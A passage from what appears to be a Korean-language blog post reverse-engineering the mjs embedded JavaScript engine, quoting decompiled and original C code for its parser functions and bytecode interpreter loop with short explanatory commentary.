460LL); pnext(pa); res = parse_logical_or(pa, op); if ( res == MJS_OK \u0026amp;\u0026amp; off_if ) mjs_bcode_insert_offset(pa, pa-\u0026gt;mjs, off_if, pa-\u0026gt;cur_idx - off_if - 1); } } } else { mjs_set_errorf(pa-\u0026gt;mjs, MJS_SYNTAX_ERROR, \u0026#34;parser stack overflow\u0026#34;); res = MJS_SYNTAX_ERROR; } --pa-\u0026gt;depth; return res; } 함수 기본적인 틀은 다 똑같다. 매크로로 구현해둬서 그렇다. parse_unary에서만 조금 바뀐다.\nmjs_err_t __cdecl parse_unary(pstate *p, int prev_op) { int op; // [rsp+4h] [rbp-1Ch] mjs_err_t res; // [rsp+8h] [rbp-18h] op = 0; if ( findtok(\u0026amp;s_unary_ops, p-\u0026gt;tok.tok) ) { op = p-\u0026gt;tok.tok; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 399) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 399LL); pnext(p); } if ( findtok(\u0026amp;s_unary_ops, p-\u0026gt;tok.tok) ) res = parse_unary(p, prev_op); else res = parse_postfix(p, prev_op); if ( res ) return res; if ( op ) { if ( op == 14 ) op = 51; if ( op == 13 ) op = 50; emit_op(p, op); } return 0; } 일반적인 문자들은 parse_postfix를 타고 들어간다.\nmjs_err_t __cdecl parse_postfix(pstate *p, int prev_op) { int v2; // eax mjs_err_t res; // [rsp+8h] [rbp-18h] res = parse_call_dot_mem(p, prev_op); if ( res ) return res; if ( p-\u0026gt;tok.tok == 29 || p-\u0026gt;tok.tok == 28 ) { v2 = 53; if ( p-\u0026gt;tok.tok == 29 ) v2 = 52; emit_op(p, v2); if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 389) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 389LL); pnext(p); } return 0; } parse_call_dot_mem은 그냥 소스코드로 보는게 더 편하다.\nstatic mjs_err_t parse_call_dot_mem(struct pstate *p, int prev_op) { int ops[] = {TOK_DOT, TOK_OPEN_PAREN, TOK_OPEN_BRACKET, TOK_EOF}; mjs_err_t res = MJS_OK; if ((res = parse_literal(p, \u0026amp;p-\u0026gt;tok)) != MJS_OK) return res; while (findtok(ops, p-\u0026gt;tok.tok) != TOK_EOF) { if (p-\u0026gt;tok.tok == TOK_OPEN_BRACKET) { int prev_tok = p-\u0026gt;prev_tok; EXPECT(p, TOK_OPEN_BRACKET); if ((res = parse_expr(p)) != MJS_OK) return res; emit_byte(p, OP_SWAP); EXPECT(p, TOK_CLOSE_BRACKET); if (!findtok(s_assign_ops, p-\u0026gt;tok.tok) \u0026amp;\u0026amp; !findtok(s_postfix_ops, p-\u0026gt;tok.tok) \u0026amp;\u0026amp; /* TODO(dfrank): fix: it doesn\u0026#39;t work for prefix ops */ !findtok(s_postfix_ops, prev_tok)) { emit_byte(p, OP_GET); } } else if (p-\u0026gt;tok.tok == TOK_OPEN_PAREN) { EXPECT(p, TOK_OPEN_PAREN); emit_byte(p, OP_ARGS); while (p-\u0026gt;tok.tok != TOK_CLOSE_PAREN) { if ((res = parse_expr(p)) != MJS_OK) return res; if (p-\u0026gt;tok.tok == TOK_COMMA) pnext1(p); } emit_byte(p, OP_CALL); EXPECT(p, TOK_CLOSE_PAREN); } else if (p-\u0026gt;tok.tok == TOK_DOT) { EXPECT(p, TOK_DOT); if ((res = parse_call_dot_mem(p, TOK_DOT)) != MJS_OK) return res; } } (void) prev_op; return res; } ()를 구분해서 arg도 잘 넣어준다. parse_literal을 통해서 문자열을 읽는다. js 코드에서 mjs_print를 호출하려고 print()를 호출하면, 문자열 print는 parse_literal 함수에서 파싱된다.\nmjs_err __cdecl parse_literal(pstate *p, const tok *t) { uint8_t v2; // al __m128d v3; // xmm1 enum mjs_OPCODE v5; // [rsp+Ch] [rbp-54h] size_t oldlen; // [rsp+10h] [rbp-50h] unsigned __int64 uv; // [rsp+18h] [rbp-48h] BYREF double d; // [rsp+20h] [rbp-40h] double iv; // [rsp+28h] [rbp-38h] BYREF int next_tok; // [rsp+30h] [rbp-30h] int prev_tok; // [rsp+34h] [rbp-2Ch] int tok; // [rsp+38h] [rbp-28h] mjs_err res; // [rsp+3Ch] [rbp-24h] mbuf *bcode_gen; // [rsp+40h] [rbp-20h] const tok *ta; // [rsp+48h] [rbp-18h] BYREF pstate *pa; // [rsp+50h] [rbp-10h] pa = p; ta = t; bcode_gen = \u0026amp;p-\u0026gt;mjs-\u0026gt;bcode_gen; res = MJS_OK; tok = t-\u0026gt;tok; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 276) ) cs_log_printf(\u0026#34;[%.*s] %p\u0026#34;, pa-\u0026gt;tok.len, pa-\u0026gt;tok.ptr, \u0026amp;ta); *(_DWORD *)\u0026amp;v5 = ta-\u0026gt;tok; if ( ta-\u0026gt;tok == TOK_ASSIGN ) { res = parse_object_literal(pa); } else { switch ( *(_DWORD *)\u0026amp;v5 ) { case 8: if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 331) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 331LL); pnext(pa); res = parse_expr(pa); if ( pa-\u0026gt;tok.tok != TOK_OPEN_PAREN ) goto LABEL_39; break; case 0xA: res = parse_array_literal(pa); break; case 0xC8: d = strtod(ta-\u0026gt;ptr, 0LL); uv = strtoul(ta-\u0026gt;ptr + 2, 0LL, 16); if ( *ta-\u0026gt;ptr == 48 \u0026amp;\u0026amp; *((_BYTE *)ta-\u0026gt;ptr + 1) == 120 ) { v3 = _mm_sub_pd( (__m128d)_mm_unpacklo_epi32(_mm_loadl_epi64((const __m128i *)\u0026amp;uv), (__m128i)xmmword_24020), (__m128d)xmmword_24030); d = _mm_unpackhi_pd(v3, v3).m128d_f64[0] + v3.m128d_f64[0]; } if ( modf(d, \u0026amp;iv) == 0.0 ) { emit_byte(pa, 0xEu); emit_int(pa, (unsigned int)(int)d); } else { emit_byte(pa, 0xFu); emit_str(pa, ta-\u0026gt;ptr, ta-\u0026gt;len); } break; case 0xC9: emit_byte(pa, 0xBu); oldlen = bcode_gen-\u0026gt;len; embed_string(bcode_gen, pa-\u0026gt;cur_idx, ta-\u0026gt;ptr, ta-\u0026gt;len, 2u); pa-\u0026gt;cur_idx += LODWORD(bcode_gen-\u0026gt;len) - oldlen; break; case 0xCA: prev_tok = pa-\u0026gt;prev_tok; next_tok = ptest(pa); emit_byte(pa, 0xBu); emit_str(pa, ta-\u0026gt;ptr, ta-\u0026gt;len); v2 = 9; if ( prev_tok == 0x14 ) v2 = 3; emit_byte(pa, v2); // PUSH STR if ( !findtok(\u0026amp;s_assign_ops, next_tok) \u0026amp;\u0026amp; !findtok(\u0026amp;s_postfix_ops, next_tok) \u0026amp;\u0026amp; !findtok(\u0026amp;s_postfix_ops, prev_tok) )// ++, -- { emit_byte(pa, 0x16u); } break; case 0xD4: emit_byte(pa, 0xDu); break; case 0xD7: res = parse_function(pa); break; case 0xDC: emit_byte(pa, 0x10u); break; case 0xDF: emit_byte(pa, 0x15u); break; case 0xE1: emit_byte(pa, 0xCu); break; case 0xE9: emit_byte(pa, 0x11u); break; default: LABEL_39: mjs_set_errorf( pa-\u0026gt;mjs, MJS_SYNTAX_ERROR, \u0026#34;parse error at line %d: [%.*s]\u0026#34;, (unsigned int)pa-\u0026gt;line_no, 10LL, pa-\u0026gt;tok.ptr); return 1; } } if ( tok != 0xD7 ) { if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 344) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 344LL); pnext(pa); } return res; } 여기서 주목할건 parse_function이다.\nstatic mjs_err_t parse_function(struct pstate *p) { size_t prologue, off; int arg_no = 0; int name_provided = 0; mjs_err_t res = MJS_OK; EXPECT(p, TOK_KEYWORD_FUNCTION); if (p-\u0026gt;tok.tok == TOK_IDENT) { /* Function name was provided */ struct tok tmp = p-\u0026gt;tok; name_provided = 1; emit_byte(p, OP_PUSH_STR); emit_str(p, tmp.ptr, tmp.len); emit_byte(p, OP_PUSH_SCOPE); emit_byte(p, OP_CREATE); emit_byte(p, OP_PUSH_STR); emit_str(p, tmp.ptr, tmp.len); emit_byte(p, OP_FIND_SCOPE); pnext1(p); } emit_byte(p, OP_JMP); off = p-\u0026gt;cur_idx; emit_init_offset(p); prologue = p-\u0026gt;cur_idx; EXPECT(p, TOK_OPEN_PAREN); emit_byte(p, OP_NEW_SCOPE); // Emit names of function arguments while (p-\u0026gt;tok.tok != TOK_CLOSE_PAREN) { if (p-\u0026gt;tok.tok != TOK_IDENT) SYNTAX_ERROR(p); emit_byte(p, OP_SET_ARG); emit_int(p, arg_no); arg_no++; emit_str(p, p-\u0026gt;tok.ptr, p-\u0026gt;tok.len); if (ptest(p) == TOK_COMMA) pnext1(p); pnext1(p); } EXPECT(p, TOK_CLOSE_PAREN); if ((res = parse_block(p, 0)) != MJS_OK) return res; emit_byte(p, OP_RETURN); prologue += mjs_bcode_insert_offset(p, p-\u0026gt;mjs, off, p-\u0026gt;cur_idx - off - MJS_INIT_OFFSET_SIZE); emit_byte(p, OP_PUSH_FUNC); emit_int(p, p-\u0026gt;cur_idx - 1 /* OP_PUSH_FUNC */ - prologue); if (name_provided) { emit_op(p, TOK_ASSIGN); } return res; } 소스코드로 보면 명확하게 보인다. tok는 ident로 들어가기 때문에, 결국 print 문자열을 그대로 집어넣게 된다.\njs가 인터프리터 언어라서 그런지 예상했던대로 그대로 문자열을 넣는다.\nres = parse_statement_list(\u0026amp;p, 0); emit_byte(\u0026amp;p, 0x23u); // OP_EXIT *(_DWORD *)\u0026amp;p.mjs-\u0026gt;bcode_gen.buf[start_idx + 8] = p.mjs-\u0026gt;bcode_gen.len - start_idx; map_len = p.offset_lineno_map.len; llen = cs_varint_llen(SLODWORD(p.offset_lineno_map.len)); mbuf_resize(\u0026amp;p.mjs-\u0026gt;bcode_gen, llen + p.mjs-\u0026gt;bcode_gen.size); cs_varint_encode(map_len, (uint8_t *)\u0026amp;p.mjs-\u0026gt;bcode_gen.buf[p.mjs-\u0026gt;bcode_gen.len], llen); p.mjs-\u0026gt;bcode_gen.len += llen; mbuf_append(\u0026amp;p.mjs-\u0026gt;bcode_gen, p.offset_lineno_map.buf, p.offset_lineno_map.len); *(_DWORD *)\u0026amp;p.mjs-\u0026gt;bcode_gen.buf[start_idx] = p.mjs-\u0026gt;bcode_gen.len - start_idx; mbuf_free(\u0026amp;p.offset_lineno_map); if ( res ) mbuf_free(\u0026amp;mjsa-\u0026gt;bcode_gen); else mjs_bcode_commit(mjsa); return res; } mjs_parse 함수의 뒷부분을 보면 파싱이 끝나고 mjs_bcode_commit을 통해서 mjs-\u0026gt;bcode_parts로 바이트 코드를 옮기는 것을 알 수 있다.\nmjs_execute mjs_err_t __cdecl mjs_execute(mjs *mjs, size_t off, mjs_val_t *res) { mjs_val_t v3; // rax mjs_val_t v4; // rax mjs_val_t v5; // rax mjs_val_t v6; // rax mjs_val_t v7; // rax mjs_val_t v8; // rax mjs_val_t v9; // rax mjs_val_t v10; // rax mjs_val_t v11; // rax mjs_val_t v12; // rax mjs_val_t v13; // rax mjs_val_t v14; // rax mjs_val_t v15; // rax mjs_val_t v16; // rax mjs_val_t v17; // rax double v18; // xmm0_8 mjs_val_t v19; // rax __m128d v20; // xmm1 mjs_val_t v21; // rax void (__fastcall *ptr)(mjs *); // rax mjs_val_t *v23; // rax mjs_val_t v24; // rax __m128d v25; // xmm1 mjs_val_t v26; // rax __m128d v27; // xmm1 mjs_val_t v28; // rax __m128d v29; // xmm1 mjs_val_t v30; // rax mjs_val_t *v31; // rax mjs_val_t v32; // rax mjs_val_t v33; // rax mjs_val_t v34; // rax mjs_bcode_part *v35; // rax mjs_val_t v36; // rax mjs_err error; // [rsp+4h] [rbp-2DCh] mjs *v39; // [rsp+8h] [rbp-2D8h] mjs *v40; // [rsp+10h] [rbp-2D0h] mjs *v41; // [rsp+18h] [rbp-2C8h] mjs *v42; // [rsp+20h] [rbp-2C0h] mjs *v43; // [rsp+28h] [rbp-2B8h] mbuf *p_loop_addresses; // [rsp+30h] [rbp-2B0h] mbuf *v45; // [rsp+38h] [rbp-2A8h] mbuf *v46; // [rsp+68h] [rbp-278h] mjs *v47; // [rsp+70h] [rbp-270h] mjs *v48; // [rsp+78h] [rbp-268h] mjs_val_t v49; // [rsp+80h] [rbp-260h] mjs *v50; // [rsp+88h] [rbp-258h] mbuf *p_arg_stack; // [rsp+90h] [rbp-250h] mjs *v52; // [rsp+98h] [rbp-248h] mjs *v53; // [rsp+A0h] [rbp-240h] mjs *v54; // [rsp+A8h] [rbp-238h] mjs *v55; // [rsp+B0h] [rbp-230h] mjs *v56; // [rsp+B8h] [rbp-228h] mbuf *m; // [rsp+C0h] [rbp-220h] mjs *v58; // [rsp+C8h] [rbp-218h] mjs *v59; // [rsp+D0h] [rbp-210h] mjs *v60; // [rsp+D8h] [rbp-208h] mjs *v61; // [rsp+E0h] [rbp-200h] mjs *v62; // [rsp+E8h] [rbp-1F8h] mjs *v63; // [rsp+F0h] [rbp-1F0h] mjs *v64; // [rsp+F8h] [rbp-1E8h] mjs *v65; // [rsp+100h] [rbp-1E0h] mjs *v66; // [rsp+108h] [rbp-1D8h] mjs *v67; // [rsp+110h] [rbp-1D0h] mjs *v68; // [rsp+118h] [rbp-1C8h] size_t scopes_len_1; // [rsp+128h] [rbp-1B8h] size_t scopes_len_0; // [rsp+130h] [rbp-1B0h] int off_0; // [rsp+13Ch] [rbp-1A4h] int off_0a; // [rsp+13Ch] [rbp-1A4h] int l2; // [rsp+140h] [rbp-1A0h] BYREF int l1; // [rsp+144h] [rbp-19Ch] BYREF mjs_val_t b; // [rsp+148h] [rbp-198h] mjs_val_t a; // [rsp+150h] [rbp-190h] int op; // [rsp+15Ch] [rbp-184h] size_t retval_pos; // [rsp+160h] [rbp-180h] mjs_val_t v; // [rsp+168h] [rbp-178h] mjs_val_t key_3; // [rsp+170h] [rbp-170h] mjs_val_t obj_2; // [rsp+178h] [rbp-168h] int v82; // [rsp+180h] [rbp-160h] int n_7; // [rsp+184h] [rbp-15Ch] int llen2; // [rsp+188h] [rbp-158h] BYREF int llen1; // [rsp+18Ch] [rbp-154h] BYREF size_t off_call; // [rsp+190h] [rbp-150h] mjs_val_t retval_stack_idx; // [rsp+198h] [rbp-148h] mjs_val_t *func; // [rsp+1A0h] [rbp-140h] int func_pos; // [rsp+1ACh] [rbp-134h] size_t off_ret; // [rsp+1B0h] [rbp-130h] mjs_val_t scope; // [rsp+1B8h] [rbp-128h] mjs_val_t key_2; // [rsp+1C0h] [rbp-120h] mjs_val_t name; // [rsp+1C8h] [rbp-118h] mjs_val_t obj_1; // [rsp+1D0h] [rbp-110h] mjs_val_t *iterator; // [rsp+1D8h] [rbp-108h] int n_6; // [rsp+1E0h] [rbp-100h] int llen_6; // [rsp+1E4h] [rbp-FCh] BYREF int64_t n_5; // [rsp+1E8h] [rbp-F8h] int llen_5; // [rsp+1F4h] [rbp-ECh] BYREF int length; // [rsp+1F8h] [rbp-E8h] int llen_4; // [rsp+1FCh] [rbp-E4h] BYREF mjs_val_t val_0; // [rsp+200h] [rbp-E0h] BYREF mjs_val_t key_1; // [rsp+208h] [rbp-D8h] mjs_val_t obj_0; // [rsp+210h] [rbp-D0h] mjs_val_t arr; // [rsp+220h] [rbp-C0h] mjs_val_t val; // [rsp+228h] [rbp-B8h] mjs_val_t key_0; // [rsp+230h] [rbp-B0h] mjs_val_t obj; // [rsp+238h] [rbp-A8h] mjs_val_t key; // [rsp+240h] [rbp-A0h] int n_3; // [rsp+24Ch] [rbp-94h] int llen_3; // [rsp+250h] [rbp-90h] BYREF int n_2; // [rsp+254h] [rbp-8Ch] int llen_2; // [rsp+258h] [rbp-88h] BYREF int n_1; // [rsp+25Ch] [rbp-84h] int llen_1; // [rsp+260h] [rbp-80h] BYREF int n_0; // [rsp+264h] [rbp-7Ch] int llen_0; // [rsp+268h] [rbp-78h] BYREF int n; // [rsp+26Ch] [rbp-74h] int llen; // [rsp+270h] [rbp-70h] BYREF mjs_header_item_t bcode_offset; // [rsp+274h] [rbp-6Ch] mjs_bcode_part bp_0; // [rsp+278h] [rbp-68h] const uint8_t *code; // [rsp+298h] [rbp-48h] size_t start_off; // [rsp+2A0h] [rbp-40h] int loop_addresses_len; // [rsp+2A8h] [rbp-38h] int scopes_len; // [rsp+2ACh] [rbp-34h] int len; // [rsp+2B0h] [rbp-30h] int call_stack_len; // [rsp+2B4h] [rbp-2Ch] int stack_len; // [rsp+2B8h] [rbp-28h] uint8_t opcode; // [rsp+2BEh] [rbp-22h] uint8_t prev_opcode; // [rsp+2BFh] [rbp-21h] size_t i; // [rsp+2C0h] [rbp-20h] mjs_val_t *resa; // [rsp+2C8h] [rbp-18h] size_t offa; // [rsp+2D0h] [rbp-10h] mjs *mjsa; // [rsp+2D8h] [rbp-8h] mjsa = mjs; offa = off; resa = res; prev_opcode = 0x27; opcode = 0x27; stack_len = mjs-\u0026gt;stack.len; call_stack_len = mjs-\u0026gt;call_stack.len; len = mjs-\u0026gt;arg_stack.len; scopes_len = mjs-\u0026gt;scopes.len; loop_addresses_len = mjs-\u0026gt;loop_addresses.len; start_off = off; bp_0 = *mjs_bcode_part_get_by_offset(mjs, off); mjs_set_errorf(mjs, MJS_OK, 0LL); free(mjs-\u0026gt;stack_trace); mjs-\u0026gt;stack_trace = 0LL; offa -= bp_0.start_idx; i = offa; while ( 2 ) { if ( i \u0026gt;= bp_0.data.len ) goto clean; mjsa-\u0026gt;cur_bcode_offset = i; if ( (*((_BYTE *)mjsa + 464) \u0026amp; 2) != 0 \u0026amp;\u0026amp; maybe_gc(mjsa) ) *((_BYTE *)mjsa + 464) \u0026amp;= ~2u; code = (const uint8_t *)bp_0.data.p; mjs_disasm_single((const uint8_t *)bp_0.data.p, i); prev_opcode = opcode; opcode = code[i]; switch ( opcode ) { case 0u: goto LABEL_93; case 1u: mjs_pop(mjsa); goto LABEL_93; case 2u: v47 = mjsa; v24 = vtop(\u0026amp;mjsa-\u0026gt;stack); mjs_push(v47, v24); goto LABEL_93; case 3u: a = mjs_pop(mjsa); b = mjs_pop(mjsa); mjs_push(mjsa, a); mjs_push(mjsa, b); goto LABEL_93; case 4u: n_0 = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen_0); i += llen_0 + n_0; goto LABEL_93; case 6u: n_2 = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen_2); i += llen_2; v60 = mjsa; v11 = vtop(\u0026amp;mjsa-\u0026gt;stack); if ( mjs_is_truthy(v60, v11) ) i += n_2; goto LABEL_93; case 7u: n_1 = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen_1); i += llen_1; v61 = mjsa; v10 = mjs_pop(mjsa); if ( !mjs_is_truthy(v61, v10) ) { mjs_push(mjsa, 0xFFF3000000000000LL); i += n_1; } goto LABEL_93; case 8u: n_3 = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen_3); i += llen_3; v59 = mjsa; v12 = vtop(\u0026amp;mjsa-\u0026gt;stack); if ( !mjs_is_truthy(v59, v12) ) i += n_3; goto LABEL_93; case 9u: key = vtop(\u0026amp;mjsa-\u0026gt;stack); v58 = mjsa; v13 = mjs_find_scope(mjsa, key); mjs_push(v58, v13); goto LABEL_93; case 0xAu: if ( !mjs_stack_size(\u0026amp;mjsa-\u0026gt;scopes) ) __assert_fail( \u0026#34;mjs_stack_size(\u0026amp;mjs-\u0026gt;scopes) \u0026gt; 0\u0026#34;, \u0026#34;src/mjs_exec.c\u0026#34;, 0x2D5u, \u0026#34;mjs_err_t mjs_execute(struct mjs *, size_t, mjs_val_t *)\u0026#34;); v56 = mjsa; v15 = vtop(\u0026amp;mjsa-\u0026gt;scopes); mjs_push(v56, v15); goto LABEL_93; case 0xBu: length = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen_4); v55 = mjsa; v16 = mjs_mk_string(mjsa, (const char *)\u0026amp;code[i + 1 + llen_4], length, 1); mjs_push(v55, v16); i += length + llen_4; goto LABEL_93; case 0xCu: v65 = mjsa; v6 = mjs_mk_boolean(mjsa, 1); mjs_push(v65, v6); goto LABEL_93; case 0xDu: v66 = mjsa; v5 = mjs_mk_boolean(mjsa, 0); mjs_push(v66, v5); goto LABEL_93; case 0xEu: n_5 = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen_5); v54 = mjsa; v17 = mjs_mk_number(mjsa, (double)(int)n_5); mjs_push(v54, v17); i += llen_5; goto LABEL_93; case 0xFu: n_6 = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen_6); v53 = mjsa; v52 = mjsa; v18 = strtod((const char *)\u0026amp;code[i + 1 + llen_6], 0LL); v19 = mjs_mk_number(v52, v18); mjs_push(v53, v19); i += n_6 + llen_6; goto LABEL_93; case 0x10u: v68 = mjsa; v3 = mjs_mk_null(); mjs_push(v68, v3); goto LABEL_93; case 0x11u: v67 = mjsa; v4 = mjs_mk_undefined(); mjs_push(v67, v4); goto LABEL_93; case 0x12u: v64 = mjsa; v7 = mjs_mk_object(mjsa); mjs_push(v64, v7); goto LABEL_93; case 0x13u: v63 = mjsa; v8 = mjs_mk_array(mjsa); mjs_push(v63, v8); goto LABEL_93; case 0x14u: n = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen); v62 = mjsa; v9 = mjs_mk_function(mjsa, i + bp_0.start_idx - n); mjs_push(v62, v9); i += llen; goto LABEL_93; case 0x15u: mjs_push(mjsa, mjsa-\u0026gt;vals.this_obj); goto LABEL_93; case 0x16u: obj_0 = mjs_pop(mjsa); // SCOPE key_1 = mjs_pop(mjsa); // ENCODED STR val_0 = 0xFFF3000000000000LL; if ( !getprop_builtin(mjsa, obj_0, key_1, \u0026amp;val_0) )// NOT PROPERTY BUILTIN { if ( mjs_is_object(obj_0) ) val_0 = mjs_get_v_proto(mjsa, obj_0, key_1);// OBJECT -\u0026gt; GET PROTO else mjs_prepend_errorf(mjsa, MJS_TYPE_ERROR, \u0026#34;type error\u0026#34;); } mjs_push(mjsa, val_0); if ( prev_opcode == 9 ) mjsa-\u0026gt;vals.last_getprop_obj = 0xFFF3000000000000LL; else mjsa-\u0026gt;vals.last_getprop_obj = obj_0; goto LABEL_93; case 0x17u: obj = mjs_pop(mjsa); key_0 = mjs_pop(mjsa); if ( !mjs_get_own_property_v(mjsa, obj, key_0) ) mjs_set_v(mjsa, obj, key_0, 0xFFF3000000000000LL); goto LABEL_93; case 0x18u: op = code[i + 1]; exec_expr(mjsa, op); ++i; goto LABEL_93; case 0x19u: val = mjs_pop(mjsa); arr = mjs_pop(mjsa); if ( mjs_array_push(mjsa, arr, val) ) mjs_set_errorf(mjsa, MJS_TYPE_ERROR, \u0026#34;append to non-array\u0026#34;); goto LABEL_93; case 0x1Au: v82 = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;llen1); n_7 = cs_varint_decode_unsafe(\u0026amp;code[llen1 + 1 + i], \u0026amp;llen2); key_3 = mjs_mk_string(mjsa, (const char *)\u0026amp;code[i + 1 + llen1 + llen2], n_7, 1); obj_2 = vtop(\u0026amp;mjsa-\u0026gt;scopes); v = mjs_arg(mjsa, v82); mjs_set_v(mjsa, obj_2, key_3, v); i += n_7 + llen2 + llen1; goto LABEL_93; case 0x1Bu: m = \u0026amp;mjsa-\u0026gt;scopes; v14 = mjs_mk_object(mjsa); push_mjs_val(m, v14); goto LABEL_93; case 0x1Cu: if ( mjsa-\u0026gt;scopes.len \u0026gt; 1 ) mjs_pop_val(\u0026amp;mjsa-\u0026gt;scopes); else mjs_set_errorf(mjsa, MJS_INTERNAL_ERROR, \u0026#34;scopes underflow\u0026#34;); goto LABEL_93; case 0x1Du: retval_stack_idx = vtop(\u0026amp;mjsa-\u0026gt;arg_stack); func_pos = mjs_get_int(mjsa, retval_stack_idx) - 1; func = vptr(\u0026amp;mjsa-\u0026gt;stack, func_pos); // get pointer mjs_pop_val(\u0026amp;mjsa-\u0026gt;arg_stack); if ( mjs_is_function(*func) ) { call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx); off_call = mjs_get_func_addr(*func) - 1; bp_0 = *mjs_bcode_part_get_by_offset(mjsa, off_call); code = (const uint8_t *)bp_0.data.p; i = off_call - bp_0.start_idx; *func = 0xFFF3000000000000LL; } else if ( mjs_is_ffi_sig(*func) ) { call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx); mjs_ffi_call2(mjsa); call_stack_restore_frame(mjsa); } else if ( mjs_is_foreign(*func) ) { call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx); ptr = (void (__fastcall *)(mjs *))mjs_get_ptr(mjsa, *func); ptr(mjsa); call_stack_restore_frame(mjsa); } else { mjs_set_errorf(mjsa, MJS_TYPE_ERROR, \u0026#34;calling non-callable\u0026#34;); } goto LABEL_93; case 0x1Eu: off_ret = call_stack_restore_frame(mjsa); if ( off_ret == 0x7FFFFFFF ) goto clean; bp_0 = *mjs_bcode_part_get_by_offset(mjsa, off_ret); code = (const uint8_t *)bp_0.data.p; i = off_ret - bp_0.start_idx; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_exec.c\u0026#34;, 781) ) cs_log_printf(\u0026#34;RETURNING TO %d\u0026#34;, (unsigned int)(off_ret + 1)); LABEL_93: if ( mjsa-\u0026gt;error == MJS_OK ) { ++i; continue; } mjs_gen_stack_trace(mjsa, i + bp_0.start_idx - 1); mjsa-\u0026gt;stack.len = stack_len; mjsa-\u0026gt;call_stack.len = call_stack_len; mjsa-\u0026gt;arg_stack.len = len; mjsa-\u0026gt;scopes.len = scopes_len; mjsa-\u0026gt;loop_addresses.len = loop_addresses_len; mjs_push(mjsa, 0xFFF3000000000000LL); clean: error = mjsa-\u0026gt;error; v35 = mjs_bcode_part_get_by_offset(mjsa, start_off); *((_BYTE *)v35 + 24) = error \u0026amp; 0xF | *((_BYTE *)v35 + 24) \u0026amp; 0xF0; v36 = mjs_pop(mjsa); *resa = v36; return mjsa-\u0026gt;error; case 0x1Fu: off_0 = cs_varint_decode_unsafe(\u0026amp;code[i + 1], \u0026amp;l1); v43 = mjsa; p_loop_addresses = \u0026amp;mjsa-\u0026gt;loop_addresses; v25 = _mm_sub_pd( (__m128d)_mm_unpacklo_epi32((__m128i)mjs_stack_size(\u0026amp;mjsa-\u0026gt;scopes), (__m128i)xmmword_24020), (__m128d)xmmword_24030); v26 = mjs_mk_number(v43, _mm_unpackhi_pd(v25, v25).m128d_f64[0] + v25.m128d_f64[0]); push_mjs_val(p_loop_addresses, v26); v45 = \u0026amp;mjsa-\u0026gt;loop_addresses; v27 = _mm_sub_pd( (__m128d)_mm_unpacklo_epi32((__m128i)(off_0 + l1 + i + 1), (__m128i)xmmword_24020), (__m128d)xmmword_24030); v28 = mjs_mk_number(mjsa, _mm_unpackhi_pd(v27, v27).m128d_f64[0] + v27.m128d_f64[0]); push_mjs_val(v45, v28); off_0a = cs_varint_decode_unsafe(\u0026amp;code[l1 + 1 + i], \u0026amp;l2); v46 = \u0026amp;mjsa-\u0026gt;loop_addresses; v29 = _mm_sub_pd( (__m128d)_mm_unpacklo_epi32((__m128i)(off_0a + l2 + l1 + i + 1), (__m128i)xmmword_24020), (__m128d)xmmword_24030); v30 = mjs_mk_number(mjsa, _mm_unpackhi_pd(v29, v29).m128d_f64[0] + v29.m128d_f64[0]); push_mjs_val(v46, v30); i += l2 + l1; goto LABEL_93; case 0x20u: if ( mjs_stack_size(\u0026amp;mjsa-\u0026gt;loop_addresses) \u0026lt; 3 ) { mjs_set_errorf(mjsa, MJS_SYNTAX_ERROR, \u0026#34;misplaced \u0026#39;break\u0026#39;\u0026#34;); } else { mjs_pop_val(\u0026amp;mjsa-\u0026gt;loop_addresses); v39 = mjsa; v33 = mjs_pop_val(\u0026amp;mjsa-\u0026gt;loop_addresses); i = mjs_get_int(v39, v33) - 1; v40 = mjsa; v34 = mjs_pop_val(\u0026amp;mjsa-\u0026gt;loop_addresses); scopes_len_1 = mjs_get_int(v40, v34); if ( mjs_stack_size(\u0026amp;mjsa-\u0026gt;scopes) \u0026lt; scopes_len_1 ) __assert_fail( \u0026#34;mjs_stack_size(\u0026amp;mjs-\u0026gt;scopes) \u0026gt;= scopes_len\u0026#34;, \u0026#34;src/mjs_exec.c\u0026#34;, 0x3B5u, \u0026#34;mjs_err_t mjs_execute(struct mjs *, size_t, mjs_val_t *)\u0026#34;); mjsa-\u0026gt;scopes.len = 8 * scopes_len_1; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_exec.c\u0026#34;, 952) ) cs_log_printf(\u0026#34;BREAKING TO %d\u0026#34;, (unsigned int)(i + 1)); } goto LABEL_93; case 0x21u: if ( mjs_stack_size(\u0026amp;mjsa-\u0026gt;loop_addresses) \u0026lt; 3 ) { mjs_set_errorf(mjsa, MJS_SYNTAX_ERROR, \u0026#34;misplaced \u0026#39;continue\u0026#39;\u0026#34;); } else { v42 = mjsa; v31 = vptr(\u0026amp;mjsa-\u0026gt;loop_addresses, -3); scopes_len_0 = mjs_get_int(v42, *v31); if ( mjs_stack_size(\u0026amp;mjsa-\u0026gt;scopes) \u0026lt; scopes_len_0 ) __assert_fail( \u0026#34;mjs_stack_size(\u0026amp;mjs-\u0026gt;scopes) \u0026gt;= 